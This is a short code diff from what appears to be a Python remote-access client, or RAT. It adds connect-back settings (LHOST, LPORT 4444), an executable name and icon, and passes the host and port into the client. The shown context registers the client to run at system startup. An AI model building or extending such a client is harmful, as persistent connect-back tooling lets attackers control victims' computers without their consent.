@@ -57,10 +57,15 @@ FILE_SHARE_READ = 1
 FILE_SHARE_DELETE = 4
 CREATE_ALWAYS = 2
 
+LHOST = "127.0.0.1"
+LPORT = 4444
+FILENAME = "client"
+ICON = "icon.ico"
+
 class CLIENT:
     def __init__(self, host, port):
-        self.host = "ip"
-        self.port = 4545
+        self.host = host
+        self.port = port
         self.curdir = os.getcwd()
         self.script_path = os.path.abspath(sys.argv[0])
     
@@ -1868,7 +1873,7 @@ User: {os.getlogin()}
                     except Exception as e:
                         print("[ERR] %s"%str(e))
 
-sock = CLIENT('127.0.0.1', 4444)
+sock = CLIENT(LHOST, LPORT)
 
 if __name__ == '__main__':
     sock.add_to_startup_registry()
